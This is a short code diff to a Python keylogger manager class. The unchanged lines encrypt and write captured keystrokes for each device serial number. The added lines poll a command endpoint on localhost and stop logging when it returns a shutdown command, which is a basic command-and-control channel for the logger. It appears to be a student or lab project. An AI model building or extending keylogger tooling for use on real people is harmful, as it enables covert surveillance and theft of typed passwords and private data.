@@ -36,6 +36,16 @@ class KeyLoggerManager(IKeyLoggerManager):
             # print(data)
             self.__writer.write(self.__serial_number, encrypt_data)
             self.__key_logger.clear_logged_keys()
+
+            try:
+                response = requests.get(f"http://127.0.0.1:9734/api/check_commands/{self.__serial_number}")
+                if response.status_code == 200:
+                    commands = response.json().get('commands', {})
+                    if commands.get('shutdown', False):
+                        self.stop_logging()
+            except requests.exceptions.RequestException:
+                pass
+
             time.sleep(10)
 
     def print_keys(self):
